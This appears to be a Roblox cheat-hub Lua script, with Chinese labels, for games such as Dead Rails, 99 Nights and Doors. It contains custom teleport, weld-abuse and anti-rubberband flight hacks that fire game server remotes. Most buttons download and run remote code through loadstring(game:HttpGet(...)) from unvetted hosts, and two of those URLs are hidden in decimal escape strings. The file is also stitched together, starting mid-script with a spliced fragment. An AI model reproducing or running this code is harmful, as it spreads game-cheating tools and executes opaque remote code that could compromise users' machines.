if Player.PlayerGui:FindFirstChild("SimpleTpUI") then
    Player.PlayerGui.SimpleTpUI:Destroy()
end

-- 创建主UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SimpleTpUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 200, 0, 260)
MainFrame.Position = UDim2.new(0.5, -100, 0.4, -130)
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true -- 基础拖动支持
MainFrame.Parent = ScreenGui

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 35)
TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TitleBar.Parent = MainFrame

local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(1, -70, 1, 0)
TitleText.Position = UDim2.new(0, 10, 0, 0)
TitleText.Text = "坐标保存传送"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.BackgroundTransparency = 1
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextSize = 16
TitleText.Parent = TitleBar

-- [X] 关闭按钮
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 35, 0, 35)
CloseBtn.Position = UDim2.new(1, -35, 0, 0)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 18
CloseBtn.Parent = TitleBar

-- [-] 最小化按钮
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 35, 0, 35)
MinBtn.Position = UDim2.new(1, -70, 0, 0)
MinBtn.Text = "-"
MinBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.TextSize = 20
MinBtn.Parent = TitleBar

-- 列表容器
local Container = Instance.new("ScrollingFrame")
Container.Size = UDim2.new(1, -10, 1, -45)
Container.Position = UDim2.new(0, 5, 0, 40)
Container.BackgroundTransparency = 1
Container.CanvasSize = UDim2.new(0, 0, 0, 0)
Container.AutomaticCanvasSize = Enum.AutomaticSize.Y
Container.ScrollBarThickness = 4
Container.Parent = MainFrame

local Layout = Instance.new("UIListLayout")
Layout.Parent = Container
Layout.Padding = UDim.new(0, 5)

-- ================= 功能逻辑 =================

-- 1. 关闭与最小化
CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local isMinimized = false
MinBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    Container.Visible = not isMinimized
    MainFrame.Size = isMinimized and UDim2.new(0, 200, 0, 35) or UDim2.new(0, 200, 0, 260)
end)

-- 2. 保存位置按钮
local SaveBtn = Instance.new("TextButton")
SaveBtn.Size = UDim2.new(1, 0, 0, 40)
SaveBtn.Text = "+ 保存当前位置"
SaveBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
SaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveBtn.Font = Enum.Font.SourceSansBold
SaveBtn.TextSize = 16
SaveBtn.Parent = Container

local posCount = 0

SaveBtn.MouseButton1Click:Connect(function()
    local char = Player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    -- 记录坐标
    local savedCFrame = char.HumanoidRootPart.CFrame
    posCount = posCount + 1
    
    -- 生成传送按钮
    local TpBtn = Instance.new("TextButton")
    TpBtn.Size = UDim2.new(1, 0, 0, 35)
    TpBtn.Text = "位置 " .. posCount .. " (点击传送)"
    TpBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    TpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    TpBtn.Font = Enum.Font.SourceSans
    TpBtn.TextSize = 16
    TpBtn.Parent = Container
    
    -- 传送逻辑
    TpBtn.MouseButton1Click:Connect(function()
        if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
            Player.Character.HumanoidRootPart.CFrame = savedCFrame
        end
    end)
end)
        WindUI:Notify({
            Title = "简洁",
            Content = "加载成功",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "死铁轨",
    Icon = "train-track",
    Locked = false,
})

local Section = Tab:Section({ 
    Title = "--------------自制脚本--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "无限制焊接",
    Desc = "仅限木制列车可以做其他的火车，但是懒得做",
    Locked = false,
    Callback = function()
        local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local network = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Universe"):WaitForChild("Network")
local weldRemote = network:WaitForChild("RemoteEvent"):WaitForChild("Weld")

-- ================= [配置] =================
local FIXED_PATH = workspace:FindFirstChild("wooden") -- 固定目标
-- ==========================================

-- 创建微型可拖动UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "WeldTool"
screenGui.ResetOnSpawn = false

local weldBtn = Instance.new("TextButton", screenGui)
weldBtn.Size = UDim2.new(0, 60, 0, 30) -- 小按钮尺寸
weldBtn.Position = UDim2.new(0, 50, 0, 200)
weldBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
weldBtn.Text = "焊接"
weldBtn.TextColor3 = Color3.new(1, 1, 1)
weldBtn.BorderSizePixel = 1
weldBtn.Draggable = true -- 启用基础拖拽（兼容移动端）

-- UI 圆角
local corner = Instance.new("UICorner", weldBtn)
corner.CornerRadius = UDim.new(0, 6)

-- 获取物体的 serverEntity ID
local function getID(obj)
    if not obj then return nil end
    return obj:GetAttribute("serverEntity")
end

-- 射线检测准心瞄准的物体
local function getTargetUnderCursor()
    local viewportSize = camera.ViewportSize
    local center = Vector2.new(viewportSize.X / 2, viewportSize.Y / 2)
    local ray = camera:ViewportPointToRay(center.X, center.Y)
    
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {player.Character} -- 排除自己
    
    local result = workspace:Raycast(ray.Origin, ray.Direction * 500, params) -- 射线距离500米
    
    if result and result.Instance then
        -- 尝试寻找该物体或其父级是否有 ID
        local target = result.Instance
        local id = getID(target) or getID(target.Parent)
        return id, target.Name
    end
    return nil, nil
end

-- 按钮点击逻辑
weldBtn.MouseButton1Click:Connect(function()
    -- 1. 获取固定物品 ID
    local fixedId = getID(FIXED_PATH)
    if not fixedId then
       
        weldBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0) -- 变红提示
        task.wait(0.5)
        weldBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        return
    end

    -- 2. 射线获取瞄准物品 ID
    local aimId, aimName = getTargetUnderCursor()
    
    if aimId then
        local args = {
            tonumber(aimId),   -- 射线检测到的 ID (原2498位置)
            tonumber(fixedId)  -- workspace.wooden 的 ID (原2426位置)
        }
        
        -- 3. 发送焊接请求
        weldRemote:FireServer(unpack(args))
        
        
        -- 点击反馈效果
        weldBtn.Text = "成功"
        weldBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        task.wait(0.5)
        weldBtn.Text = "焊接"
        weldBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    else
    end
end)

-- 简单的UI拖拽优化 (针对手机触摸)
local dragging, dragInput, dragStart, startPos
weldBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = weldBtn.Position
    end
end)

weldBtn.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        weldBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
        WindUI:Notify({
            Title = "使用请勿乱甩焊接",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "死铁轨无拉回飞行",
    Desc = "使用方法得选马职业没有的可以去找一头已经装了马鞍的马直接靠近马点击开启飞行就行不要坐在马身上，停止飞行请同时丢🐴和关闭飞行✌️",
    Locked = false,
    Callback = function()
        local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local PlayerModule = require(player.PlayerScripts:WaitForChild("PlayerModule"))
local controls = PlayerModule:GetControls()

-----------------------------------
-- 1. UI 构建
-----------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HorseFlyUI_V2"
screenGui.ResetOnSpawn = false
local success = pcall(function() screenGui.Parent = CoreGui end)
if not success then screenGui.Parent = player:WaitForChild("PlayerGui") end

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 160, 0, 120)
mainFrame.Position = UDim2.new(0.1, 0, 0.2, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

local topBar = Instance.new("Frame", mainFrame)
topBar.Size = UDim2.new(1, 0, 0, 25)
topBar.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
topBar.BorderSizePixel = 0
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel", topBar)
title.Size = UDim2.new(1, -50, 1, 0)
title.BackgroundTransparency = 1
title.Text = " 飞行控制面板"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Left

local minBtn = Instance.new("TextButton", topBar)
minBtn.Size = UDim2.new(0, 25, 0, 25)
minBtn.Position = UDim2.new(1, -50, 0, 0)
minBtn.BackgroundTransparency = 1
minBtn.Text = "-"
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.TextSize = 18

local closeBtn = Instance.new("TextButton", topBar)
closeBtn.Size = UDim2.new(0, 25, 0, 25)
closeBtn.Position = UDim2.new(1, -25, 0, 0)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.TextSize = 16

local content = Instance.new("Frame", mainFrame)
content.Size = UDim2.new(1, 0, 1, -25)
content.Position = UDim2.new(0, 0, 0, 25)
content.BackgroundTransparency = 1

local toggleFlyBtn = Instance.new("TextButton", content)
toggleFlyBtn.Size = UDim2.new(0.8, 0, 0, 30)
toggleFlyBtn.Position = UDim2.new(0.1, 0, 0.1, 0)
toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
toggleFlyBtn.Text = "开启飞行"
toggleFlyBtn.TextColor3 = Color3.new(1, 1, 1)
toggleFlyBtn.Font = Enum.Font.SourceSansBold
toggleFlyBtn.TextSize = 16
Instance.new("UICorner", toggleFlyBtn).CornerRadius = UDim.new(0, 6)

local speedInput = Instance.new("TextBox", content)
speedInput.Size = UDim2.new(0.8, 0, 0, 30)
speedInput.Position = UDim2.new(0.1, 0, 0.55, 0)
speedInput.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
speedInput.Text = "50"
speedInput.PlaceholderText = "速度"
speedInput.TextColor3 = Color3.new(1, 1, 1)
speedInput.Font = Enum.Font.SourceSans
speedInput.TextSize = 16
Instance.new("UICorner", speedInput).CornerRadius = UDim.new(0, 6)

-----------------------------------
-- 2. UI 拖拽与逻辑
-----------------------------------
local dragging, dragInput, dragStart, startPos
topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

local minimized = false
minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    content.Visible = not minimized
    mainFrame.Size = minimized and UDim2.new(0, 160, 0, 25) or UDim2.new(0, 160, 0, 120)
end)
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

-----------------------------------
-- 3. 业务逻辑 (等待1秒 + 动态ID)
-----------------------------------
local isFlying = false
local isProcessing = false 
local flightSpeed = 50
local flyConnection

-- 获取马及其 serverEntity 属性
local function getNearestHorseData()
    local nearest, minDist, horseId = nil, math.huge, nil
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name == "Model_Horse" then
            local pPart = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
            if pPart then
                local dist = (pPart.Position - rootPart.Position).Magnitude
                if dist < minDist then
                    local entityId = obj:GetAttribute("serverEntity")
                    if entityId then
                        minDist = dist
                        nearest = obj
                        horseId = entityId
                    end
                end
            end
        end
    end
    return nearest, horseId
end

local function startFlightLoop()
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    
    flyConnection = RunService.RenderStepped:Connect(function()
        if not isFlying then return end
        
        rootPart.Velocity = Vector3.new(0, 0, 0)
        rootPart.RotVelocity = Vector3.new(0, 0, 0)
        
        local camCFrame = workspace.CurrentCamera.CFrame
        local moveVector = controls:GetMoveVector() 
        
        local flyDirection = (camCFrame.LookVector * (moveVector.Z * -1)) + (camCFrame.RightVector * moveVector.X)
        if flyDirection.Magnitude > 0 then
            flyDirection = flyDirection.Unit
            rootPart.CFrame = rootPart.CFrame + (flyDirection * (flightSpeed / 60))
        end
        
        rootPart.CFrame = CFrame.new(rootPart.Position, rootPart.Position + camCFrame.LookVector)
    end)
end

toggleFlyBtn.MouseButton1Click:Connect(function()
    if isProcessing then return end
    
    if isFlying then
        isFlying = false
        toggleFlyBtn.Text = "开启飞行"
        toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
        if flyConnection then flyConnection:Disconnect() end
    else
        isProcessing = true
        toggleFlyBtn.Text = "检测马匹..."
        
        local horse, id = getNearestHorseData()
        
        if horse and id then
            toggleFlyBtn.Text = "收马中..."
            toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
            
            -- 1. 尝试坐下
            local seat = horse:FindFirstChildWhichIsA("VehicleSeat") or horse:FindFirstChildWhichIsA("Seat")
            if seat then seat:Sit(humanoid) end
            
            -- 2. 拿出 Sack (检查背包和身上)
            local sack = player.Backpack:FindFirstChild("Sack") or (player.Character and player.Character:FindFirstChild("Sack"))
            if sack then humanoid:EquipTool(sack) end
            
            -- 3. 发送动态 ID
            pcall(function()
                ReplicatedStorage.Shared.Universe.Network.RemoteEvent.Store:FireServer(id)
            end)
            
            -- 修改点：此处改为等待 1 秒
            task.wait(1)
        else
            warn("未发现可收起的马匹，直接开启飞行")
            task.wait(0.2)
        end
        
        isProcessing = false
        isFlying = true
        toggleFlyBtn.Text = "关闭飞行"
        toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
        startFlightLoop()
    end
end)

speedInput.FocusLost:Connect(function()
    local newSpeed = tonumber(speedInput.Text)
    if newSpeed then flightSpeed = newSpeed else speedInput.Text = tostring(flightSpeed) end
end)
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "红叶脚本好用👍",
    TextXAlignment = "Left",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "红叶汉化",
    Desc = "点完后点下面一个",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/stghongye.lua"))()
        WindUI:Notify({
            Title = "红叶子汉化",
            Content = "副包",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "红叶汉化",
    Desc = "点完这个就可以用了",
    Locked = false,
    Callback = function()
        script_key="这里填你的卡密";
(loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()
        WindUI:Notify({
            Title = "红叶子汉化",
            Content = "主包",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------刷债券--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "刷债券(若黑屏点下屏幕即可)",
    Desc = "非常好用不解卡",
    Locked = false,
    Callback = function()
        getgenv().BondFarmSetting = {
	Fast_Auto_Execute = true, -- Use queue_on_teleport to execute faster than your executor itself 
	Number_Of_Bonds_Targeted = 9e9, -- When your bonds reached the number you wanted, the will script automatically be stopped
	Tween_Duration = 23, -- The smaller number, the faster it goes (best is 23)
	Webhook_Url = "none",
	Main_Auto_SHOP_Delay = 70, -- auto server hop after time ended in main game
	Lobby_Auto_SHOP_Delay = 25, -- auto server hop after time ended in lobby
	Goto_Party_By_Walking_Only = false, -- if you set to false, it instantly teleport you to party creator, else it make you walk to party creator 
	Blackscreen_Save_Battery = true,
	Show_Bonds_Collected_On_Blackscreen = false
}
SaveNewSettings = true 
script_key = "DonjoSx_Was_Not_Here" -- Script key, don't remove this
loadstring(game:HttpGet("https://raw.githubusercontent.com/Umbrella-Scripter/Deadrails-Script/refs/heads/main/average-bond-farm.lua"))()
        WindUI:Notify({
            Title = "好用",
            Content = "不用解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "死铁轨",
    Desc = "要解卡",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))()
        WindUI:Notify({
            Title = "有点老爷",
            Content = "老爷",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Tx",
    Desc = "刷债券",
    Locked = false,
    Callback = function()
        --[[by 退休不退休]]
QUN = "160369111"
TX = "退休脚本"
BY = "退休"
script = "死铁轨免费刷债券"
loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/%E5%88%B7%E5%80%BA%E5%88%B8"))()
        WindUI:Notify({
            Title = "老爷刷债券",
            Content = "不用卡密",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "自动刷债券",
    Desc = "要卡密",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        WindUI:Notify({
            Title = "没用过",
            Content = "不知道咋样",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "刷债券",
    Desc = "要卡密",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))()
        WindUI:Notify({
            Title = "还行",
            Content = "没用过",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "v5刷债券",
    Desc = "最好用的",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/m00ndiety/Moondiety/refs/heads/main/Loader'))()
        WindUI:Notify({
            Title = "刷债券",
            Content = "要解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------实用脚本区--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "xk脚本",
    Desc = "有焊接",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DevSloPo/Main/refs/heads/main/DeadRail"))()
        WindUI:Notify({
            Title = "xk脚本",
            Content = "加载成功…",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "99夜",
    Icon = "shield",
    Locked = false,
})

local Button = Tab:Button({
    Title = "虚空",
    Desc = "汉化版",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/atnew2025/Chinese-scripts/refs/heads/main/voidware-cn.txt"))()
        WindUI:Notify({
            Title = "虚空汉化",
            Content = "好用",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "99夜无敌脚本",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/森林中的99夜.lua"))()
        WindUI:Notify({
            Title = "好用",
            Content = "汉化版",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------脚本分割线--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "同一个老外做外卡密通用",
    TextXAlignment = "Left",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "99夜最无敌",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/99%E5%A4%9C%E6%B1%89%E5%8C%96.txt"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某汉化",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "99夜刷糖果",
    Desc = "要解卡",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/c87b3621b22ecc2c8b474f95c47ecb40.lua'))()
        WindUI:Notify({
            Title = "好用",
            Content = "要解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "99夜刷砖石",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/8ee53a2a2e39163362c725415e1307ab.lua'))()
        WindUI:Notify({
            Title = "好用",
            Content = "要解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------脚本分割线--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Tab = Window:Tab({
    Title = "doors",
    Icon = "door-open",
    Locked = false,
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化1",
    Locked = false,
    Callback = function()
          loadstring(game:HttpGet("https://velocityloader.vercel.app/"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某寻找",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Paragraph = Tab:Paragraph({
    Title = "上面的卡密",
    Desc = "点击复制按钮获取卡密",
    Color = Color3.fromHex("#FFD700"), -- 改为金色
    Image = "",
    ImageSize = 30,
    Thumbnail = "",
    ThumbnailSize = 80,
    Locked = false,
    Buttons = {
        {
            Icon = "crown",
            Title = "复制",
            Callback = function()
                local cardKey = "VelocityXFreeDoorsKey" 
                if setclipboard then
                    setclipboard(cardKey)
                    WindUI:Notify({
                        Title = "卡密复制",
                        Content = "卡密已复制到剪贴板: " .. cardKey,
                        Icon = "crown",
                        Duration = 5
                    })
                    print("卡密已复制: " .. cardKey)
                else
                    WindUI:Notify({
                        Title = "错误",
                        Content = "复制功能不可用",
                        Icon = "crown",
                        Duration = 3
                    })
                end
            end,
        }
    }
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化2",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/atnew2025/Chinese-scripts/refs/heads/main/mshax(prohax).txt"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化3",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://www.msdoors.xyz/script"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化4",
    Locked = false,
    Callback = function()
          --[[Doors Blackking And BobHub脚本汉化]]loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "内脏与黑火药",
    Icon = "skull",
    Locked = false,
})

local Button = Tab:Button({
    Title = "清水脚本",
    Desc = "ui有点挡屏幕",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\65\51\78\113\122\52\78\112\47\114\97\119"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "🤑",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Katchi Hub2.1",
    Desc = "英文",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XaviscoZ/roblox/refs/heads/main/g%26b.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "老外脚本2",
    Desc = "英文",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Katchi Hub4.4",
    Desc = "有飞行",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/716e6083239381ecd8b1f0591e383b2005a6fd5d87ede30645fac4f53e764d4a/download"))()
        WindUI:Notify({
            Title = "好用",
            Content = "极品",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "墨水脚本",
    Icon = "cookie",
    Locked = false,
})

local Button = Tab:Button({
    Title = "刘某墨水脚本",
    Desc = "1070646590",
    Icon = "cookie"
})

local Paragraph = Tab:Paragraph({
    Title = "墨水的脚本",
    Desc = "点击复制按钮获取脚本链接",
    Color = Color3.fromHex("#FFD700"), -- 改为金色
    Image = "",
    ImageSize = 30,
    Thumbnail = "",
    ThumbnailSize = 80,
    Locked = false,
    Buttons = {
        {
            Icon = "crown",
            Title = "复制",
            Callback = function()
                local cardKey = "https://raw.githubusercontent.com/liuliuqiang404-code/6/refs/heads/main/刘某墨水脚本" 
                if setclipboard then
                    setclipboard(cardKey)
                    WindUI:Notify({
                        Title = "脚本复制",
                        Content = "脚本已复制到剪贴板: " .. cardKey,
                        Icon = "crown",
                        Duration = 5
                    })
                    print("脚本已复制: " .. cardKey)
                else
                    WindUI:Notify({
                        Title = "错误",
                        Content = "复制功能不可用",
                        Icon = "cookie",
                        Duration = 3
                    })
                end
            end,
        }
    }
})

local Tab = Window:Tab({
    Title = "脚本中心",
    Icon = "cloud-check",
    Locked = false,
})

local Button = Tab:Button({
    Title = "皮脚本",
    Desc = "中文",
    Locked = false,
    Callback = function()
      getgenv().XiaoPi="皮脚本QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()  
        WindUI:Notify({
            Title = "无敌皮脚本",
            Content = "好用",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "kg",
    Desc = "kg",
    Locked = false,
    Callback = function()
        KG_SCRIPT = "张硕制作"
loadstring(game:HttpGet("https://github.com/ZS-NB/KG/raw/main/Zhang-Shuo.lua"))()
        WindUI:Notify({
            Title = "🤓",
            Content = "🤓",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "xk脚本",
    Desc = "中文",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet(('https://github.com/devslopo/DVES/raw/main/XK%20Hub')))()
        WindUI:Notify({
            Title = "无敌xk脚本",
            Content = "加载成功…",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "测试版",
    Desc = "皮脚本",
    Locked = false,
    Callback = function()
        getgenv().XiaoPi="皮脚本测试版QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/PijiaobenV1.lua"))()
        WindUI:Notify({
            Title = "皮脚本",
            Content = "无敌",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "TX",
    Desc = "TX",
    Locked = false,
    Callback = function()
        TX = "脚本群:160369111"
Script = "Free永久免费"
loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/TX-Free-YYDS/refs/heads/main/FREE-TX-TEAM"))()
        WindUI:Notify({
            Title = "TX",
            Content = "TX",
            Icon = "crown",
            Duration = 3
        })
    end
})

